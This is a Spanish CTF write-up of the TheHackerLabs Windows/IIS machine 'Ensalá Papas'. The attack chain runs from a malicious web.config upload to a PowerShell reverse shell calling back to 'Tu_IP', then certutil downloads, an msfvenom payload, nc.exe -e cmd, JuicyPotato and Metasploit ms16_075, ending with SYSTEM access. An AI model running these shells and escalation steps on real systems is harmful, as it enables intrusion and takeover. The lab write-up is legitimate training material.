---
title: "Ensalá Papas  - TheHackerLabs"
date: 2024-12-03
draft: false
slug: "THL-writeup-ensalaPapas"
excerpt: "Una máquina bastante similar a la máquina Bounty de HTB. Después de descubrir el puerto 445 y el puerto 80, intentamos listar los recursos compartidos del servicio SMB, pero al no poder hacerlo, nos vamos al servicio HTTP al cual le aplicamos Fuzzing, así descubrimos una página que nos permite subir archivos. Aplicando un ataque Spider con BurpSuite, descubrimos que acepta archivos con extensión .config. Investigando, hay una forma de subir un archivo malicioso web.config que nos permite tener una CMD en una página web, misma que aplicamos, y así es como obtenemos una Reverse Shell. Por último, revisando los privilegios de nuestro usuario, tenemos el SeImpersonatePrivilege, lo que nos permite utilizar la herramienta Juicy Potato para escalar privilegios y convertirnos en Administrador."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "Microsoft IIS", "Fuzzing", "BurpSuite", "Sniper Attack", "Abusing File Upload", "Malicious web.config File", "ASP/ASPX Payload", "Privesc - Juicy Potato", "Privesc - MS16-075-Reflection-Juicy", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "smbclient"
  - "smbmap"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "rlwrap"
  - "nc"
  - "powershell"
  - "systeminfo"
  - "whoami"
  - "certutil.exe"
  - "python3"
  - "JuicyPotato.exe"
  - "nc.exe"
  - "msfvenom"
  - "mshta.exe"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/windows/misc/hta_server"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/ms16_075_reflection_juicy"
links:
  - "https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt"
  - "https://jaykiee.medium.com/rce-by-uploading-a-web-config-7390e140a45b"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-.config-files"
  - "https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config"
  - "https://github.com/ohpe/juicy-potato"
  - "https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise"
  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-ensalaPapas/EnsalaPapas.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo:
```bash
nmap -sn 192.168.1.0/24
Nmap scan report for 192.168.1.010
Host is up (0.00045s latency).
MAC Address: 00:00:00:00:00:00 
```
Lo encontramos con la siguiente IP: `192.168.1.010`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.010
PING 192.168.1.010 (192.168.1.010) 56(84) bytes of data.
64 bytes from 192.168.1.010: icmp_seq=1 ttl=128 time=3.17 ms
64 bytes from 192.168.1.010: icmp_seq=2 ttl=128 time=0.876 ms
64 bytes from 192.168.1.010: icmp_seq=3 ttl=128 time=0.724 ms
64 bytes from 192.168.1.010: icmp_seq=4 ttl=128 time=0.683 ms

--- 192.168.1.010 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.683/1.364/3.173/1.046 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.010 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:15 CST
Initiating ARP Ping Scan at 13:15
Scanning 192.168.1.010 [1 port]
Completed ARP Ping Scan at 13:15, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:15
Scanning 192.168.1.010 [65535 ports]
Discovered open port 445/tcp on 192.168.1.010
Discovered open port 139/tcp on 192.168.1.010
Discovered open port 135/tcp on 192.168.1.010
Discovered open port 80/tcp on 192.168.1.010
Discovered open port 49156/tcp on 192.168.1.010
Discovered open port 49155/tcp on 192.168.1.010
Discovered open port 49154/tcp on 192.168.1.010
Completed SYN Stealth Scan at 13:16, 51.41s elapsed (65535 total ports)
Nmap scan report for 192.168.1.010
Host is up, received arp-response (0.00090s latency).
Scanned at 2024-12-02 13:15:14 CST for 52s
Not shown: 42833 closed tcp ports (reset), 22695 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 51.64 seconds
           Raw packets sent: 129835 (5.713MB) | Rcvd: 42844 (1.714MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo dos posibles formas que podemos aplicar para la intrusión, pero veamos qué información obtenemos de los servicios activos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,445,49154,49155,49156 192.168.1.010 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:16 CST
Nmap scan report for 192.168.1.010
Host is up (0.00075s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5

|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: <unknown>, NetBIOS MAC: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-12-02T10:42:05
|_  start_date: 2024-12-02T10:28:03
|_clock-skew: -8h35m33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.53 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

No nos mostró mucha información que digamos, así que vamos a ir directamente a probar el **servicio SMB**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio SMB {#SMB}

Veamos qué información nos da **crackmapexec**:
```bash
crackmapexec smb 192.168.1.010
SMB         192.168.1.010 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
```
Tenemos el dominio y la versión de SO que está ocupando y parece que no necesitamos credenciales válidas para loguearnos, pero hay que comprobarlo.

Probemos si es posible listar los archivos compartidos con **smblcient**:
```bash
smbclient -L //192.168.1.010// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.010 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Parece que no podremos.

Hagamos un último intento con **smbmap**:
```bash  
smbmap -H 192.168.1.010

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[!] Access denied on 192.168.1.010, no fun for you...                                                                  
[*] Closed 1 connections
```
Nada.

Probemos si el **servicio SMB** es vulnerable con scripts de **nmap**:
```bash  
nmap --script "vuln and safe" -p 445 192.168.1.010
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:20 CST
Nmap scan report for 192.168.1.010
Host is up (0.00075s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```
Tampoco nada. Entonces vayamos a probar el **servicio HTTP** para ver qué encontramos.

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura1.png">
</p>

No hay nada como tal.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura2.png">
</p>

Igual, no mucho.

Tampoco encontraremos algo si revisamos el código fuente, por lo qué vamos a aplicar **Fuzzing** para ver que podemos encontrar, pero indicaremos que busque algún archivo **asp o aspx**.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,aspx-asp-txt http://192.168.1.010/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://192.168.100.225/FUZZ.FUZ2Z
Total requests: 661635

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000020968:   400        0 L      2 W        20 Ch       "*checkout* - aspx"                                                                                                                             
000028804:   200        120 L    61 W       1159 Ch     "zoc - aspx"
...
...
...
...
Total time: 984.9511
Processed Requests: 661635
Filtered Requests: 661597
Requests/sec.: 671.7439
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.010/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x asp,aspx,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.010/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
...
...
...
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

En ambos obtuvimos un resultado que podemos investigar.

### Aplicando Sniper Attack con BurpSuite {#BurpSuite}

Veamos esa ruta que encontramos:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura3.png">
</p>

Parece que podemos subir archivos, pero no sabemos de qué clase es el correcto.

Vamos a aplicar un **ataque Sniper** con **BurpSuite** para identificar los archivos que sí acepta.

Puedes descargar el siguiente **wordlist**:
* <a href="https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt" target="_blank">Respositorio de InfoSecWarrior: File-Extensions-Wordlist.txt</a>

Ahora la idea es capturar una subida de archivos, tan solo crea un archivo de texto random, cárgalo a la página web, captúralo con **BurpSuite** y luego mándalo al **Intruder**:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura4.png">
</p>

Aquí estoy mostrando el campo en el que se aplicará el **ataque Sniper**, que es `filename=` seleccionando la extensión del archivo. Se carga como payload nuestro **wordlist** que ya descargamos y le quitamos la opción que **URL Encodea** cada petición, ya que nos puede dar conflictos al aplicar el ataque.

Y lo iniciamos:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura5.png">
</p>

Te puedes dar cuenta de las opciones que fueron aceptadas al ver el tamaño de la respuesta.

Parece que acepta las siguientes extensiones de archivos:
* *.config*
* *.doc*
* *.docx*
* *.gif*
* *.jpeg*
* *.jpg*
* *.png*
* *.xls*
* *.xlsx*

Con varias de estas extensiones no podremos hacer mucho, a excepción de `.config`.

## Explotación de Vulnerabilidades {#Explotacion}

### Cargando una CMD en un Archivo web.config y Obteniendo una Reverse Shell {#cmd}

Investigando un poco, tenemos que nuestra biblia **HackTricks** tiene información sobre cómo aprovecharnos de **archivos .config**:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#execute-.config-files" target="_blank">HackTricks: IIS - Internet Information Services - Execute .config files</a>

Ahí nos muestra un ejemplo de un **archivo web.config** y un blog que nos explica cómo usar estos archivos para ejecutar comandos:
* <a href="https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/" target="_blank">Upload a web.config File for Fun & Profit</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config" target="_blank">Repositorio de swisskyrepo: web.config</a>

El ejemplo que nos dan, es para que podamos obtener una **CMD** como una página web.

Tan solo debemos descargar ese ejemplo y cargarlo.

El problema es que, una vez que lo carguemos, no sabemos a dónde va a parar.

Pero si revisamos el código fuente, después de cargar nuestro archivo malicioso, podemos encontrar la ruta donde se están guardando:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura6.png">
</p>

Tan solo debemos ir a esa ruta y ya podremos ver nuestra **CMD** en la web:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura7.png">
</p>

Prueba a ejecutar un comando como `whoami`:

<p align="center">
<img src="/assets/images/THL-writeup-ensalaPapas/Captura8.png">
</p>

Excelente, parece que somos un usuario llamado **info**.

Ahora, podemos obtener una **Reverse Shell** desde esta **CMD**.

Abre una **netcat** usando **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

En mi caso, voy a aplicar la siguiente:
```batch
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('Tu_IP',Puerto_a_Usar);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Observa el resultado:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.010] 49159
PS C:\windows\system32\inetsrv> whoami
win-4qu3qnhnk7e\info
```
Estamos dentro.

## Post Explotación {#Post}

### Enumeración de la Máquina y Escalando Privilegios con Juicy Potato {#JuicyPotato}

Como somos el **usuario info**, podemos obtener su flag:
```batch
PS C:\windows\system32\inetsrv> cd C:\Users\info
PS C:\Users\info> dir

    Directorio: C:\Users\info

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        18/06/2024     19:33         25 user.txt                          

PS C:\Users\info> type user.txt
...
```
Excelente, sigamos avanzando.

Veamos la información del sistema operativo (SO):
```batch
PS C:\Users\info> systeminfo

Nombre de host:                            WIN-4QU3QNHNK7E
Nombre del sistema operativo:              Microsoft Windows Server 2008 R2 Datacenter 
Versi?n del sistema operativo:             6.1.7600 N/D Compilaci?n 7600
```

Veamos qué privilegios tenemos:
```batch
PS C:\Windows\Temp> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```
Tenemos él `SeImpersonatePrivilege`, entonces, podemos utilizar la herramienta **Juicy Potato** para escalar privilegios.

Puedes descargarlo aquí:
* <a href="https://github.com/ohpe/juicy-potato" target="_blank">Repositorio de ohpe: Juicy Potato</a>

Una vez que lo tengas descargado, necesitaremos también el **binario nc.exe** para poder ejecutarlo con **Juicy Potato** y obtener una **Reverse Shell**, que si usas **Kali Linux** lo deberías tener:
```bash
locate nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Aunque si no quieres usar el **binario nc.exe**, puedes crear tu propia **Reverse Shell** con **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Ahora los pasamos a la máquina víctima, abriendo un servidor con **Python** y descargándolos en el directorio `/Temp` con la herramienta **certutil.exe**:
```batch
PS C:\Windows\Temp> certutil.exe -urlcache -split -f http://Tu_IP/nc.exe nc.exe
****  En l?nea  ****
  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.
PS C:\Windows\Temp> certutil.exe -urlcache -split -f http://Tu_IP/JuicyPotato.exe JuicyPotato.exe
****  En l?nea  ****
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
```

Abre una **netcat** usando otro puerto:
```bash
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
```

Y ejecutamos el **Juicy Potato**, indicándole que nos mande una **CMD** a nuestra IP, agregándole un **CLSID** para la versión del SO que usa la máquina.

El **CLSID** lo puedes obtener aquí:
* <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise" target="_blank">Repositorio de ohpe: Windows_Server_2008_R2_Enterprise</a>

Ejecuta el **Juicy Potato**:
```batch
PS C:\Windows\Temp> ./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd Tu_IP 1337" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
```

Si estás usando una **Reverse Shell** que tú creaste con **msfvenom**, modifica el comando para que quede de esta manera:
```batch
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\shell.exe" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

Y observa el resultado:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.010] 49194
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Ya solo buscamos la flag del **Administrador**:
```batch
C:\Windows\system32>cd C:\Users\Administrador\Desktop
cd C:\Users\Administrador\Desktop
C:\Users\Administrador\Desktop>type root.txt
type root.txt
...
```
Hemos completado la máquina.

### Obteniendo Sesión de Meterpreter con Módulo hta_server y Buscando Vulnerabilidades con Módulo local_exploit_suggester {#Metasploit}

Digamos que, una vez dentro, queremos obtener una sesión de **meterpreter**.

Podemos usar el módulo `exploit/windows/misc/hta_server` para mandarnos una sesión desde la máquina víctima a nuestra sesión de **metasploit** usando la herramienta **mshta.exe**.

Pero primero, comprobemos que tengamos **mshta.exe** en la máquina víctima (que debería estar):
```batch
PS C:\Windows\Temp> dir C:\Windows\System32\mshta.exe

    Directorio: C:\Windows\System32

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        14/07/2009      3:39      43520 mshta.exe
```
Lo tenemos y parece que si lo podemos usar.

Inicia **metasploit** y busca el módulo **hta_server**:
```bash
msf6 > search hta_server

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  exploit/windows/misc/hta_server  2016-10-06       manual  No     HTA Web Server

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) >
```

Lo configuramos y lo ejecutamos:
```bash
msf6 exploit(windows/misc/hta_server) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(windows/misc/hta_server) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/misc/hta_server) > set SRVPORT 80
SRVPORT => 80
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on Tu_IP:5555 
[*] Using URL: http://Tu_IP/tqAnegB.hta
```

Copiamos la URL que nos dio y en la máquina víctima, usamos la herramienta **mshta.exe** para que mande una sesión de **meterpreter**:
```batch
PS C:\Windows\Temp> ./mshta.exe http://Tu_IP/tqAnegB.hta
```

Observamos el **metasploit**:
```bash
[*] Server started.
[*] 192.168.1.010  hta_server - Delivering Payload
[*] Sending stage (177734 bytes) to 192.168.1.010
[*] Meterpreter session 2 opened (Tu_IP:5555 -> 192.168.1.010:49166) at 2024-12-02 22:12:25 -0600

msf6 exploit(windows/misc/hta_server) > sessions

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  2         meterpreter x86/windows  WIN-4QU3QNHNK7E\info @ WIN-4QU3QNHNK7E  Tu_IP:5555 -> 192.168.1.010:49166 (192.168.1.010)
```
Ya tenemos nuestra sesión de **meterpreter**.

Ahora podemos usar el módulo `post/multi/recon/local_exploit_suggester`, que va a identificar los Exploits a los que es vulnerable la máquina víctima:
```bash
msf6 exploit(windows/misc/hta_server) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester

msf6 exploit(windows/misc/hta_server) > use 0
msf6 post(multi/recon/local_exploit_suggester) >
```

Lo configuramos y lo ejecutamos:
```bash
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2
msf6 post(multi/recon/local_exploit_suggester) > exploit
*] Running check method for exploit 42 / 42
[*] 192.168.1.010 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                                                                             
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                                             
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!  
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.                                                                             
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                             
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                             
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                             
 8   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                              
 9   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                             
 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.                                                                             
 11  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```
Parece que la máquina es vulnerable a varios Exploits, pero me llama la atención el módulo `exploit/windows/local/ms16_075_reflection_juicy`, pues por lo que entiendo, es la versión de **Juicy Potato**, pero de **metasploit**.

#### Escalando Privilegios con Exploit ms16_075_reflection_juicy de Metasploit Framework {#JuicyMetas}

Vamos a usar este módulo y a configurarlo:
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 2
SESSION => 2
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set CLSID {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
CLSID => {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Y lo ejecutamos:
```bash
msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit

[*] Started reverse TCP handler on Tu_IP:4444 
[+] Target appears to be vulnerable (Windows 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 128 launched.
[*] Reflectively injecting the exploit DLL into 128...
[*] Injecting exploit into 128...
[*] Exploit injected. Injecting exploit configuration into 128...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 192.168.1.010
[*] Meterpreter session 3 opened (Tu_IP:4444 -> 192.168.1.010:49173) at 2024-12-02 22:20:04 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-4QU3QNHNK7E
OS              : Windows Server 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```
Excelente, hemos escalado privilegios con un módulo de **metasploit**.
